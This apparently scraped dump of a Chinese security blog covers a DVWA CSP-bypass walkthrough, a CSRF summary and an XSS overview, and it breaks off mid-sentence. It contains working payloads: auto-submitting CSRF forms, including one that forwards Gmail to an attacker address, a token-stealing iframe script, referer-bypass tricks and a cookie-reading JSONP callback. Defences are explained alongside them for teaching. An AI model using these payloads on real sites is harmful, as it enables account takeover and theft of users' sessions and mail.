hastebin.com, jquery and google analytics.//设置CSP头header($headerCSP);# These might work if you can&#x27;t create your own for some reason# https://pastebin.com/raw/R570EE00# https://hastebin.com/raw/ohulaquzex?&gt;&lt;?php//接受include参数if (isset ($_POST[&#x27;include&#x27;])) &#123;//拼接参数$page[ &#x27;body&#x27; ] .= &quot; &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#x27;; 构造payload 1https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;jWN8HLKe https://pastebin.com是一个快速文本分享网站，我们可以插入我们的xss代码。 配合CSRF，诱惑用户自动触发漏洞。 123456789101112131415&lt;form id=&quot;csp&quot; name=&quot;csp&quot; method=&quot;POST&quot; action=&quot;http://192.168.1.200/DVWA-master/vulnerabilities/csp/&quot;&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot;&gt; &lt;script&gt; var cspb = document.getElementById(&quot;csp&quot;); cspb[0].value=&quot;https://pastebin.com/raw/rcBeKDgL&quot;; cspb.submit(); &lt;/script&gt; &lt;/form&gt; Medium源码 12345678910111213141516171819202122232425&lt;?php//js脚本只允许本域、允许使用内联资源、而且设置了nonce属性$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;header($headerCSP);// Disable XSS protections so that inline alert boxes will workheader (&quot;X-XSS-Protection: 0&quot;);# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#x27;; 构造payload 可以加载本地的script并且需要nonce值。 1&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(1)&lt;&#x2F;script&gt; High源码 1234567891011121314151617181920212223&lt;?php//只能加载本地的script$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;header($headerCSP);?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt;&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;&#x27;; 分析../..//vulnerabilities/csp/source/jsonp.php 1234567891011121314&lt;?phpheader(&quot;Content-Type: application&#x2F;json; charset&#x3D;UTF-8&quot;);if (array_key_exists (&quot;callback&quot;, $_GET)) &#123; $callback &#x3D; $_GET[&#39;callback&#39;];&#125; else &#123; return &quot;&quot;;&#125;$outp &#x3D; array (&quot;answer&quot; &#x3D;&gt; &quot;15&quot;);echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;?&gt; high.js文件 1234567891011121314151617181920//创建&lt;script&gt;标签，并添加src属性source/jsonp.php?callback=solveSum，其中solveSum是一个函数，用来添加anser的值。function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp.php?callback=solveSum&quot;; document.body.appendChild(s);&#125;//添加代码之后，会将answer的值打印出来，这里如果我们将callback的值修改为文本的值也会打印出来。function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);//点击按钮之后会触发clickButton函数，该函数会添加前端代码。if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125; 构造payload–直接赋予callback值payload 1include&#x3D;&lt;script src&#x3D;source&#x2F;jsonp.php?callback&#x3D;alert(document.cookie)&gt;&lt;&#x2F;script&gt; Impossible1234567891011121314151617181920212223&lt;?php$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;header($headerCSP);?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt;&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;&#x27;; Impossible.js 1234567891011121314151617181920//添加script代码function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp_impossible.php&quot;; document.body.appendChild(s);&#125;function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125; source/jsonp_impossible.php 12345678//这里没有参数值接受参数也就无法输出js代码。&lt;?phpheader(&quot;Content-Type: application/json; charset=UTF-8&quot;);$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);echo &quot;solveSum (&quot;.json_encode($outp).&quot;)&quot;;?&gt;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"CSRF漏洞","slug":"CSRF漏洞总结","date":"2019-01-08T09:12:08.000Z","updated":"2020-10-16T11:46:13.798Z","comments":true,"path":"2019/01/08/CSRF漏洞总结/","link":"","permalink":"http://s1eady.top/2019/01/08/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"CSRF漏洞总结Gmail的CSRF漏洞黑客诱惑受害者点击藏有恶意代码的空白页面 12345678910&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit();&lt;/script&gt; 这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了”Create Filter”命令，将所有的邮件，转发到”&#104;&#97;&#99;&#x6b;&#101;&#114;&#64;&#104;&#97;&#x6b;&#101;&#x72;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;“。 漏洞原理攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 受害者登录a.com，并保留了登录凭证（Cookie）。 攻击者引诱受害者访问了b.com。 b.com伪装受害者的身份向c.com 发送了一个请求。 c.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让c.com执行了自己定义的操作。 漏洞类型GET类型的CSRF只需要一个HTTP请求： 1&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;bank.example&#x2F;withdraw?amount&#x3D;10000&amp;for&#x3D;hacker&quot; &gt; 在受害者访问含有这个img的页面后，浏览器会自动向http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。 POST类型的CSRF使用的是一个自动提交的表单 123456 &lt;form action=&quot;http://bank.example/withdraw&quot; method=POST&gt; &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;xiaoming&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;hacker&quot; /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。以上两个类型不需要用户去操作，会在用户不知情的情况下自动提交请求。 链接类型的CSRF此类CSRF需要用户交互，必须用户有意识到去点击恶意连接。 1&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;csrf&#x2F;withdraw.php?amount&#x3D;1000&amp;for&#x3D;hacker&quot; taget&#x3D;&quot;_blank&quot;&gt;领取200红包&lt;a&#x2F;&gt; 漏洞特点 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 利用思路1、无需任何验证即可删除某社区的帖子 1http://zone.wooyun.org/index.php?do=edit&amp;act=delcomment&amp;fun=ajax&amp;id=311946 2、用户在快速登录(qq、微信)之后,网站要求重新填写用户名、密码、邮箱等信息 3、网站个人后台修改密码时候无验证码、旧密码、表单token认证等操作 4、敏感操作: 刷粉丝、花钱购买图书章节阅读权限、恶意打赏、恶意刷评论 利用payload1、get型–构造url 2、post型–burp可以直接生成poc 3、结合存储型xss,存放我们的csrfpoc 绕过思路1、Token绕过页面表单会生成一个token,执行操作的时候需要带上token 结合xss–将我们构造好的代码插入目标网站,获取用户当前的cookie、token等信息,发送到我们的网站 attach()函数用于获取user_token 一个iframe标签用于隐藏访问获取一个Token 一个form表单用于将修改的密码与Token进行提交数据库 12345678910111213141516&lt;script type=&quot;text/javascript&quot;&gt;function attack()&#123; document.getElementsByName(&#x27;user_token&#x27;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#x27;user_token&#x27;)[0].value; document.getElementById(&quot;transfer&quot;).submit();&#125;&lt;/script&gt;&lt;iframe src=&quot;http://192.168.0.1/xxx&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/xxx&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;/body&gt; token在url中可见+请求包的referer字段 让用户访问我们自己的网站,从用户的请求包中的referer字段拿到用户的token 使用JSONP跨域去请求Token 前提 请求是不检查Referer 使用JSONP去跨域生成Token 回传参数可以得出，默认为callback 能够fuzz出一定回调参数的值 利用:构造callback的值,发送JSONP请求,获取Token,进行表单构造利用,引诱点击 ▲ Token的值也可能与其他参数有关 2、referer绕过根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求 目标站判断了referer是否正确,但是对无referer的情况没有作出判断,逻辑上出现错误 csrfpoc使用html代码 &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; 比如 12345678910111213&lt;html&gt; &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt; &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 用户可以设置浏览器不传递referer 使用协议绕过 利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。 利用data:协议 1234567&lt;html&gt;&lt;body&gt;&lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/body&gt;&lt;/html&gt;payload:&lt;form method=post action=http://a.b.com/d&gt;&lt;input type=text name=&#x27;id&#x27; value=&#x27;123&#x27;/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt; 利用https协议 https向http跳转的时候Referer为空 payload在https环境下 1&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx.xxxxx&#x2F;attack.php&quot;&gt; attack.php写上CSRF攻击代码 Referrer Policy 隐藏referrer 1&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;steady.com&quot; referrerpolicy&#x3D;&quot;no-referrer&quot;&gt; IE6、7下使用window.location.href=url、window.open进行界面的跳转，会丢失Referer。 绕过后台逻辑判断 可以在我们的恶意url中添加上后台指定的url(把对方指定的url名字变成我们的文件夹名字) 3、jsonp跨域劫持通过发起jsonp请求，拿到服务端发回的token 防御思路1、验证码优点： 验证码类型日新月异,各种技术层出不穷。可以很好的防止CSRF 缺点： 无法大量部署。影响用户体验。不能每一步都加上验证码。 2、二次验证检查请求来源 优点: 检查请求来源的主要方式为 Referer、Origin，就是 HTTP 请求头的那个（两者比较类似，下面仅以 Referer 为例）。Referer 最常见的应用实际上是防盗链。比如我的博客就有。防盗链利用了 referer 检查请求的来源，同样也可以利用来防御 CSRF。 缺点: 用户为了保护隐私，自己阻止了浏览器发送 referer 攻击者可以让自己的页面不发送 referer：这个代码告诉浏览器，所有从当前页面中发起的请求都不要携带 referer HTTPS 转为 HTTP 的时候，浏览器出于安全的考虑，不发送 referer。例如网站中有，如果当前页面使用的是 HTTPS，而正要加载的资源使用的是 HTTP，则将 HTTP header 中的 referer 置空。但是如果是 content=”always” 的话，浏览器会把 HTTPS 的 referer 带给 HTTP 的页面 如果添加referer并且目标页面token是get形式发送(在url中可见),我们伪造一个页面让别人从目标站来访问我们自己的页面,在请求头中的referer能够带上token,导致token泄漏 3、Token那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。 CSRF Token的防护策略分为三个步骤： 1.将CSRF Token输出到页面中 Token不能放在cookie中，容易被获取，最好放在服务端到session中。之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。 2.页面提交的请求携带这个Token 对于GET请求，Token将附在请求地址之后。 对于 POST 请求来说，要在 form 的最后加上。 1&lt;input type&#x3D;”hidden” name&#x3D;”csrftoken” value&#x3D;”tokenvalue”&#x2F;&gt; 3.服务器验证Token是否正确 Token的分布式校验 Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。为此解决办法是Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。 4、同源检测服务器可以通过解析这两个Header–Origin Header、Referer Header中的域名，确定请求的来源域。 注意： IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。 302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。 Referer：对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。 如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。 5、双重cookie双重Cookie采用以下流程： 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 6、Samesite Cookie属性Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax。 Samesite=Strict 严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。 淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。 123Set-Cookie: foo&#x3D;1; Samesite&#x3D;StrictSet-Cookie: bar&#x3D;2; Samesite&#x3D;LaxSet-Cookie: baz&#x3D;3 在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。 Samesite=Lax 宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。 123Set-Cookie: foo&#x3D;1; Samesite&#x3D;StrictSet-Cookie: bar&#x3D;2; Samesite&#x3D;LaxSet-Cookie: baz&#x3D;3 当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。 该设置有个缺点，topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"xss漏洞","slug":"xss","date":"2018-12-26T02:46:32.000Z","updated":"2020-10-16T11:45:55.987Z","comments":true,"path":"2018/12/26/xss/","link":"","permalink":"http://s1eady.top/2018/12/26/xss/","excerpt":"","text":"xss原理攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 危害 窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户操作。 监听用户行为：通过恶意 js 脚本，可以做到监听用户各种事件，比如获取登陆的键入字符串完成 hack 用户信息。 更改 DOM 结构：比较常见的就是通过运营商或者路由器添加浮窗广告，增收自身收入。 分类反射型xss原理只发生一次攻击，攻击代码不经过数据库，恶意代码提交到服务器，服务器解析并响应，浏览器最后执行恶意代码 常见漏洞位置网站搜索框、用户登录入口、注入表单的地方。 存储型xss原理可发生多次攻击，攻击者利用各种办法把恶意代码存储在受害者的数据库中，当用户每次取出恶意数据的时候出发恶意代码。 常见漏洞位置论坛、博客等留言位置、评论位置。 DOM型XSS原理 DOM（Document Object Model）即文档对象模型，通过 JavaScript，您可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西。对HTML 元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。 攻击者可以控制一些DOM对象、输入一些恶意JS代码，插入DOM结构，然后未做任何过滤直接输出到页面。 比如： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM XSS&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;script&gt; var pos&#x3D;document.URL.indexOf(&quot;name&#x3D;&quot;)+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length)));&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 获取输入函数 document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname 输出函数 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) document.write(…) document.writeln(…) element.innerHTML(…) document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname) 总结：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。 业务逻辑1、用户的输入未经过数据库,直接拿到前台显示,比如搜索框 2、用户输入存入数据库,从数据库中取出,然后由相关的视图文件输出到网页,比如用户个人设置中的签名、用户名、用户描述等等 xss大多出现在输入框中 3、反射型xss输入在哪里输出就在那里,存储型xss输入之后存入数据库,取出数据库然后可能显示到各种地方 防御思路存储xss和反射xss1、纯前端渲染，把代码和数据分隔开。 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。 然后浏览器执行 HTML 中的 JavaScript。 JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免 DOM 型 XSS 漏洞。 2、直接使用html实体转义函数,比如php函数htmlspecialchars（）和htmlentities()、escapeHTML 1234567字符 转义后的字符&amp; &amp;&lt; &lt;&gt; &gt;&quot; &quot;&#39; &amp;#x27;&#x2F; &#x2F; 不能仅仅靠实体转义函数来防御xss，像javascript:alert(&amp;#x27;XSS&amp;#x27;)这种类型的攻击，实体转义函数就不会对其起作用。 而且实体转义函数就有局限性，因为如果数据是json格式，双引号被转义会破坏json格式。 但是我们可以使用escapeEmbedJSON() 函数，对内联 JSON 进行转义。 字符 转义后的字符 U+2028 \\u2028 U+2029 \\u2029 &lt; \\u003c 应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。因此html转义也完全不能避免xss攻击。 XSS 安全漏洞 简单转义是否有防护作用 HTML 标签文字内容 有 HTML 属性值 有 CSS 内联样式 无 内联 JavaScript 无 内联 JSON 无 跳转链接 无 DOM型xss在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。 DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。 其他思路1、充分利用 CSP，严格实施 CSP 操作，可以有效防范 XSS 攻击。 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的； 禁止向第三方域提交数据，这样用户数据也不会外泄； 2、使用 HttpOnly 属性。避免 js 脚本操作 Cookie，即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。 3、在用户提交时，由前端过滤输入，然后提交到后端。这种做法是不可取的。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。4、数据插入数据库,取出数据库之后进行转义,然后由视图文件输出到网页。 5、数据插入数据、取出数据库都不转义,在视图文件中进行转义 1&lt;div class=&quot;comment-content&quot;&gt;&lt;?php echo htmlspecialchars($comment[&#x27;content&#x27;];) ?&gt;&lt;/div&gt; 总结1、xss的防御不仅仅只是前端或者只是后端应该关注的问题。防范存储型和反射型 XSS 是后端的责任。而 DOM 型 XSS 攻击不发生在后端，是前端的责任。防范 XSS 是需要后端和前端共同参与的系统工程。 2、关于转义的位置不能仅仅在输入出转义，转义应该在输出 HTML 时进行，而不是在提交用户输入时。 3、html实体转义函数并不能完全防御xss。每一个转义函数转义的对象不同，因此不可能对用户的任何输入类型都进行转义。HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。 攻击思路1、如果前端限制,尝试burp抓包改包 123456# XSS-Payloadhttps://github.com/TheKingOfDuck/fuzzDicts/tree/master/easyXssPayloadhttps://github.com/ZephrFish/XSSPayloads/blob/master/raw_payloadshttps://github.com/silience/xsspayloadhttps://github.com/willc/XSSpayloads/blob/master/xss_payloads_6-20-12.txthttps://github.com/AeolusTF/XssPayload/blob/master/XssPayload.txt 2、xsspayload可以一条一条的测试,同样我们可以直接全部复制粘贴,根据弹框数字去我们的payload中找到可用的语句,同样也可以借助burp等工具fuzz测试 3、手工测试常见标签 &lt;img&gt;标签 利用方式1 12345678&lt;img 